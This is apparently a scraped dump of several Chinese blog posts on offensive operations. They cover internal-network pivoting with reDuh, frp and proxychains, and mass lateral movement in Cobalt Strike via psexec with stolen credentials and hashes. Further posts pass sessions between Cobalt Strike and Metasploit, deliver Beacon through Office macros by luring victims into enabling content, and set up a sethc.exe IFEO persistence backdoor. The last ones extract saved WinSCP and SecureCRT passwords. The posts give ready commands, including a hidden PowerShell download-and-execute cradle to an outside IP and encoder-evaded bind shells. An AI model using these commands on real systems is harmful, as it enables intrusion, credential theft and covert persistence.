(单端口转发)当目标服务器中间件等服务版本较低，reGeorg或冰蝎马等无法正常解析，就需要换用其它的http代理脚本。这是某实战中遇到的环境： 这里以reduh为例，虽然只能对指定的端口进行转发 (不适用图形化连接操作)，但可以先利用msfvenom生成正向的shell payload，再结合reduh单端口转发，上线metasploit，最后利用socks4a模块开代理。 下面把具体的流程走一遍： 12345sudo msfvenom --platform windows -p windows/shell_bind_tcp lport=53 -e x86/shikata_ga_nai -i 5 -f exe -o x86shell.exe--platform &lt;platform&gt; 指定payload的目标平台-e, --encoder &lt;encoder&gt; 指定需要使用的编码器-i, --iterations &lt;count&gt; 指定payload的编码次数 上传payload到目标服务器，并执行。 metasploit是监听转发后的地址与端口。 123456sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/shell_bind_tcpmsf5 exploit(multi/handler) &gt; set rhost 127.0.0.1msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j reDuhServer传到目标机后，使用reDuhClient进行连接，并将反弹的端口转本地后， 1234java -jar reDuhClient.jar http://103.242.xx.xx/reduh.aspxtelnet 127.0.0.1 1010 &gt;&gt;[createTunnel]5353:127.0.0.1:53 可在metasploit渗透，或开启一个socks4a，挂载其他安全工具上继续渗透。 123msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4amsf5 auxiliary(server/socks4a) &gt; set srvport 10080msf5 auxiliary(server/socks4a) &gt; run -j 注意为什么payload要用shell，而不用meterpreter。meterpreter是高级的payload，传输中占用大量数据包，这种单端口转发上线metasploit，本就不是很稳定，meterpreter会使“小水管”更加不稳定！ 隔离网络（多级代理）内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理… frp现拿到一台双网卡内网服务器权限，可以用frp建立通道，这台服务器既是服务端也是客户端。 proxifier用frp建立好后，结合proxifier添加两条代理：外网socks、内网socks，之后创建代理链 。(注意代理顺序) 设置代理规则，选择对应代理。 二层代理成功，内网隔离机445探测开放。 Proxychains命令行代理神器proxychains，设置二层代理、socks口令。(注意代理顺序) 联动metasploit，ms17_010探测，可以看到代理链的传输过程。 Metasploit针对metasploit的利用，只要sessions中的route可达，就可以直接进行多层网络渗透，更加方便。但主session掉，均掉！ 在获取目标一个sessions 后，可以查看IP段信息并自动添加路由表。 123456msf5 exploit(multi/handler) &gt; sessions 1meterpreter &gt; run get_local_subnetsmeterpreter &gt; run autoroute -pmeterpreter &gt; run post/multi/manage/autoroutemeterpreter &gt; run autoroute -pmeterpreter &gt; background 上述是在meterpreter权限中添加，或当知道目标路由表信息时，可直接添加。 12msf5 exploit(multi/handler) &gt; route add 172.20.20.0/24 1 //session id 1msf5 exploit(multi/handler) &gt; route 可在metasploit继续渗透，或开启一个socks，挂载其他工具上多层穿透。 123msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4amsf5 auxiliary(server/socks4a) &gt; set srvport 10080msf5 auxiliary(server/socks4a) &gt; run -j 总结内网穿透时，代理需要稳定、隐蔽，思路更需要不断的拓宽。毕竟在实战中，多么复杂的环境都会遇到，更多的是总结不同打法，进行落地，最终将内网的“大门”打开！ 有不同见解，或更优的方法可随时交流^_^","categories":[],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike进阶篇-批量上线","slug":"CobaltStrike进阶篇-批量上线","date":"2019-12-12T18:00:36.000Z","updated":"2021-07-07T07:16:08.873Z","comments":true,"path":"2019/1213/.html","link":"","permalink":"https://payloads.cn/2019/1213/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言当获取一台目标服务器权限时，更多是想办法扩大战果，获取目标凭据并横向进行登陆是最快速的拿权方式。但目标所处环境是否可出网，如何利用CobalStrike进行批量上线，正是本文所要讲述的内容。 获取凭据目标机器CobalStrike上线后，通常先抓取该主机凭据，选择执行 Access–&gt;Run Mimikatz ，或在Beacon中执行logonpasswords命令。需要当前会话为管理员权限，才能成功，如果权限低，请先提权~ 点击工具栏的Credentials，可以看到获取的凭据信息。（Credentials可自行添加） 当然，不是每次都能成功获取到明文密码的，要看内存中是否存储。 目标机出网psexec传递获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ） 使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。 1beacon&gt; portscan 192.168.144.0/24 445 arp 200 点击工具栏的View–&gt;Targets，查看端口探测后的存活主机。（Targets可自行添加） 选择Login–&gt;psexec传递登录。 选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 在Beacon中可以看到执行的命令，并会显示成功登录的ip，之后就便会上线CobalStrike。这样就控制了多个主机的系统权限。 附：psexec密文传递Beacon中执行的命令。【不是psexec(psh)选项】 目标机不出网Link Listener实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 首先，在已上线的主机创建Listener，监听端口可自定义。 选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 注意，选择刚建立的Listener名字，Proxy可不设置，这里生成exe保存本地。(未免杀) 上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe 。（CobalStrike本身psexec功能不够强大，且方法不唯一） 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe 端口查看，实际不出网目标机（192.168.144.196）是与出网目标机（192.168.144.155）正在建立连接。 1beacon&gt; shell netstat -ano |findstr 4444 因为这是link链接，只要主链路（即出网机Listener）掉线，就都会掉线！ SSH登录ssh批量登录比较简单，同样利用当前已上线的目标机进行登录。 1beacon&gt; portscan 192.168.144.170-210 22 arp 200 在Credentials中添加ssh的口令信息。（ssh口令可事先通过其他方式获取，不建议用此工具进行ssh爆破，效率慢） 选择Login–&gt;ssh登录。 选择刚添加的ssh口令，主机Session，即从哪台主机连接过去。 ssh成功登录后，就实现了Linux目标机的上线，在Beacon中可以看到执行的命令。若需要上线的Linux主机不多，可直接在Beacon中执行命令。 在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。 总结本文只是讲述针对不同环境的不同上线方式，利用CobalStrike对已获取权限的主机进行批量上线。不要把CobalStrike当成最优的端口探测与口令爆破方式，工具的特性并不在此。毕竟在内网中拿权要有效率，不能浪费太多时间，工具间要进行互补，发挥各自的优势。当然，上线的方式也不要局限此处！","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"CobaltStrike与Metasploit实战联动","slug":"CobaltStrike与Metasploit实战联动","date":"2019-12-10T16:22:29.000Z","updated":"2021-07-07T07:16:16.272Z","comments":true,"path":"2019/1211/.html","link":"","permalink":"https://payloads.cn/2019/1211/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。 内置Socks功能通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。 当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。 首先，到已控目标机的Beacon下将socks代理开启。 1beacon &gt; socks 1024 #端口根据VPS实际情况进行设置 点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。 本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。 123456msf5 &gt; setg Proxies socks4/5:ip:port #让msf所有模块的流量都通过此代理走。(setg全局设置)msf5 &gt; setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 &gt; set rhosts 192.168.144.0/24msf5 &gt; set threads 100 #内网渗透时线程不要太高！msf5 &gt; run 利用MSF模块上线Beacon shell当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。**(前提目标机可出网)** 先利用CobalStrike生成上线Beacon的powershell。 本地启动Metasploit，挂上代理，设置psexec_command模块参数。 12345678msf5 &gt; setg Proxies socks4/5:ip:portmsf5 &gt; use auxiliary/admin/smb/psexec_commandmsf5 &gt; set rhosts 192.168.144.0/24msf5 &gt; set threads 10msf5 &gt; set smbuser administratormsf5 &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #明文、密文均可msf5 &gt; set command powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://149.28.xx.xx:80/a&#x27;))&quot; #上线CS的powershell，目标机存在杀软需考虑msf5 &gt; run 最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。 CS与MSF会话互传CobaltStrike派生Metasploit当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令： 12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload windows/meterpreter/reverse_tcp #不要用x64的payloadmsf5 &gt; set lhost 10.11.42.99msf5 &gt; set lport 5353msf5 &gt; run -j 之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。 然后选中计算机，右键-&gt;Spawn：选择MSF的监听器： 这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。 Metasploit派生CobaltStrike现在已经获得了一个meterpreter的session，把session传给CobaltStrike。 在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。 \u0001接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令： 12345678meterpreter &gt; background msf5 &gt; use exploit/windows/local/payload_inject msf5 &gt; set payload windows/meterpreter/reverse_httpmsf5 &gt; set lhost 192.168.144.174msf5 &gt; set lport 8099msf5 &gt; set DisablePayloadHandler true msf5 &gt; set session 1msf5 &gt; run 解释一下这些参数。由于CobaltStrike的监听器我们使用的是： windows/beacon_http/reverse_http 所以我们的payload也要使用： payload windows/meterpreter/reverse_http 设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要设置成CobaltStrike机器的IP与端口。 默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置： set DisablePayloadHandler true 设置当前的session，执行run。 此时目标机便已成功从CobaltStrike上线。 总结关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Office宏的基本利用","slug":"Office宏的基本利用","date":"2019-12-09T06:35:09.000Z","updated":"2021-08-06T02:36:42.359Z","comments":true,"path":"2019/1209/.html","link":"","permalink":"https://payloads.cn/2019/1209/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。 Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。 环境准备 Windows 7 x64 旗舰版 Microsoft Office 2016 CobaltStrike 3.14 CobaltStrike生成宏先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可。 创建宏Word打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。 编写主体内容后，点击 “开发工具 — Visual Basic” 。 双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。 另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码。 反弹Beacon shell默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知。 诱导目标手动点击”启用内容”宏。 目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell。 宏代码分析CobaltStrike生成默认的VBA会导入四个Windows API函数，常见的ShellCode加载器代码： CreateRemoteThread 创建一个在其它进程地址空间中运行的线程(也称:创建远程线程). VirtualAllocEx 指定进程的虚拟空间保留或提交内存区域 WriteProcessMemory 写入某一进程的内存区域 CreateProcess 创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件 其中Array(-4,-24,-119,0,0,0,96,-119,-27...就是ShellCode，混淆的办法有很多种。 ShellCode可以自己在VBA里解码或者比如每个元素自增1，运行的时候-1，达到免杀 ……","categories":[],"tags":[{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"}]},{"title":"Shfit映像劫持后门新玩法","slug":"Shfit映像劫持后门新玩法","date":"2019-12-05T05:08:11.000Z","updated":"2021-07-07T07:18:29.174Z","comments":true,"path":"2019/1205/.html","link":"","permalink":"https://payloads.cn/2019/1205/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 映像劫持简介映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。 映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。 简单测试映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\\windows\\system32\\cmd.exe 之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。 映像劫持后门新玩法实现效果键入五下Shift执行时，先执行sethc.exe程序，当sethc.exe程序静默退出时，执行CobaltStrike的Powershell，反弹Beacon shell 。 简单来说就是：程序A静默退出结束后，会执行程序B。 GFlages测试文章地址： https://blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/ 下载gflags.exe https://docs.microsoft.com/zh-cn/previous-versions/msdn10/gg463016(v=msdn.10) 根据微软的官方文档描述，在Silent Process Exit选项卡中的配置，都保存在注册表中。 GFlags工具自动添加并修改了“IFEO”目录下sethc.exe的GlobalFlag值。 以及SilentProcessExit下ReportingMode和MonitorProcess两个值。 这时测试会发现，当键入五下Shift时，先执行sethc.exe程序，当sethc.exe程序静默退出时，便会执行cmd.exe程序。 这么一来，可以直接在命令行中对注册表进行设置。（需要管理员权限） 1234reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\\windows\\system32\\cmd.exe&quot; /f 简单解释一下ReportingMode和MonitorProcess 这两个项值的作用。MonitorProcess的值表示监视器进程。Reporting Mode可以设置为三个值 。 Flag Value 解释 LAUNCH_MONITORPROCESS 0x1 检测到进程静默退出时，将会启动监视器进程（在GFLAGS.exe中，Silent Process Exit这个选项卡所填写的值，即MonitorProcess的项值） LOCAL_DUMP 0x2 检测到进程静默退出时，将会为受监视的进程创建转储文件 NOTIFICATION 0x4 检查到进程静默退出时，将会弹出一个通知 与CobaltStrike结合利用换位思考，用上述的方法，修改MonitorProcess值放入CobaltStrike的powershell。这样，可以在渗透中做到权限的维持，按五下Shift就可以隐蔽进行反连。 实测，Windows锁屏，键入五下Shift后正常弹粘滞键，关闭之后执行powershell代码，反弹beacon的shell。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"解密Winscp客户端中保存的密码hash","slug":"解密Winscp客户端中保存的密码hash","date":"2019-12-04T14:08:50.000Z","updated":"2021-07-07T07:15:15.247Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言WinSCP是一个Windows环境下使用的SSH的开源图形化SFTP客户端。同时支持SCP协议。它的主要功能是在本地与远程计算机间安全地复制文件，并且可以直接编辑文件。而我们的主要目的是为了读取里面各种的SSH连接密码。 所有操作全部在管理员权限下进行 最新版Winscp为例通过powershell脚本搞定，或者RDP直接登录连接查询等。 「绿色版无安装记录」 12beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps1beacon&gt; powershell Get-list 前提，目标得事先保存连接密码。 确定Winscp存储位置默认情况下，Winscp配置会存储在Windows对应的注册表项下（包括了连接的IP、用户名、密码Hash）。 HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\ 具体解密过程 查看Winscp配置的Windows注册表（注册表项是固定的），如果有连接会话，再指定查询连接下所保存的密码Hash。 12beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions&quot;beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\root@192.168.144.128&quot; 将查到的信息拷贝到本地的winscppwd.exe进行解密。 RDP直接登录目标，导出Winscp配置文件，并下载到本地进行解密。(如果找到配置的ini文件，直接把对应文件down本地进行解密即可) 附脚本工具 ListInstalledPrograms.ps1 winscppwd.exe","categories":[{"name":"密码搜集","slug":"密码搜集","permalink":"https://payloads.cn/categories/%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"解密SecureCRT客户端中保存的密码hash","slug":"解密SecureCRT客户端中保存的密码hash","date":"2019-12-04T14:08:30.000Z","updated":"2021-08-30T03:37:15.579Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。 所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用文章末的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了。 确定目标SecureCRT的详细版本想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）。 12beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps1beacon&gt; powershell Get-list 确定SecureCRT配置文件目录下的Sessions目录默认情况下，SecureCRT的Config目录路径为：%APPDATA%\\VanDyke\\Config\\Sessions\\ 如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认。 Sessions目录下的每个ini文件都会以连接的IP或域名来命名。 1beacon&gt;shell dir %APPDATA%\\VanDyke\\Config\\Sessions\\ 拷贝下载Sessions目录的ini文件直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。 1234beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;Invoke-NinjaCopy.ps1beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\\Users\\r00t\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.144.128.ini&quot; -LocalDestination &quot;c:\\windows\\temp\\192.168.144.128.ini&quot;beacon&gt; shell dir c:\\windows\\temp\\192.168.144.128.ini beacon&gt; download c:\\windows\\temp\\192.168.144.128.ini 脚本解密Session将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！ 1sudo pip2 install pycrypto 1python SecureCRT-decryptpass.py 192.168.144.128.ini SecureCRT高版本解决如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\\VanDyke\\Config\\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。 目标SecureCRT版本与本地版本需一致，否则可能会出现问题。 附脚本 ListInstalledPrograms.ps1 Invoke-NinjaCopy.ps1 SecureCRT-decryptpass.py","categories":[{"name":"密码搜集","slug":"密码搜集","permalink":"https://payloads.cn/categories/%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"Frp内网穿透实战","slug":"Frp内网穿透实战","date":"2019-12-04T14:07:28.000Z","updated":"2021-07-07T07:16:21.401Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言实战中，当通过某种方式拿下目标机器权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。 更多详细使用方法，可查看官方Github，这里不再赘述。 https://github.com/fatedier/frp/ 前期准备先准备一台VPS与域名。 因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。 下载地址Frp下载地址 [跨平台，实战中根据目标机版本选择下载] https://github.com/fatedier/frp/releases 配置文件服务端12345678910111213141516171819202122232425262728293031323334353637383940#通用配置段[common]#frp服务端监听 [VPS]bind_addr = 0.0.0.0#frp服务器监听端口 [实战中可以用一些通透性较好的端口]bind_port = 7007#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]dashboard_port = 6609#服务端Web控制面板用户名与密码 [强口令]dashboard_user = SuperMandashboard_pwd = WC3pvjmh2tt8#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中log_file = ./frps.log#日志记录等级，有trace、debug、info、warn、error,通常情况下为infolog_level = info #日志保留时间log_max_days = 3#验证凭据，服务端和客户端的凭据必须一样才能连接auth_token = E0iQEBOdoJeh#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端] privilege_mode = true#特权模式Token [强口令，建议随机生成]privilege_token = kukezkHC8R1H#特权模式允许分配的端口 [避免端口被滥用] privilege_allow_ports = 4000-50000#心跳检测超时时长 heartbeat_timeout = 30#每个代理可以设置的连接池上限max_pool_count = 20#口令认证超时时间，一般不用改authentication_timeout = 900#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析] subdomain_host = xxxx.online 客户端1234567891011121314151617181920212223242526272829303132333435#通用配置段[common]#frp服务端IP或域名 [实战中一般都会直接用域名] server_addr = frp.xxxx.online#frp服务器端口server_port = 7007#授权token，此处必须与服务端保持一致，否则无法建立连接 auth_token = E0iQEBOdoJeh#启用特权模式 [特权模式下服务端无需配置] privilege_mode = true#特权模式 token,同样要与服务端完全保持一致 privilege_token = kukezkHC8R1H#心跳检查间隔与超时时间heartbeat_interval = 10 heartbeat_timeout = 30#连接数量 pool_count = 20#内网穿透通常用socks5[socks5]type = tcp#连接VPS内网穿透的远程连接端口remote_port = 9066#使用插件socks5代理plugin = socks5#启用加密 [通信内容加密传输，有效防止流量被拦截]use_encryption = true#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]use_compression = true#socks5连接口令 [根据实际情况进行配置]#plugin_user = SuperMan#plugin_passwd = ZBO0McQe6mE1 执行部署服务端SSH连接到VPS上，后台启动frp服务端。 1234root@Ubuntu:~# cd tools/frp/root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;root@Ubuntu:~/tools/frp# jobs -lroot@Ubuntu:~/tools/frp# cat frps.log 客户端将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。 当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到。 但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序。 123beacon&gt; sleep 10beacon&gt; execute c:&#x2F;frpc.exe -c c:&#x2F;frpc.inibeacon&gt; shell netstat -ano |findstr 7007 或者，创建后台运行的bat脚本。 12345@echo off if &quot;%1&quot; == &quot;h&quot; goto begin mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit :begin c:\\frpc.exe -c c:\\frpc.ini 工具穿透Metasploit当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。 [若socks5设置口令，可结合proxychains] 123456# sudo msfconsole -qmsf5 &gt; setg proxies socks5:frp.xxxx.online:9066msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 10msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.178msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run WindowsWindows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。 小结Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike基本功能与使用","slug":"CobaltStrike基本功能与使用","date":"2019-12-04T10:47:29.000Z","updated":"2021-07-07T07:16:04.770Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。 钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等。 Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。 Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。 基本功能安装Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。 服务端服务端关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行： 123chmod +x teamserver./teamserver 10.11.42.202 test123 # 服务端真实IP(不能使用0.0.0.0或127.0.0.1)和连接密码 客户端客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置。 在控制台所有操作指令都会被记录保留在Cobalt Strike目录logs下。 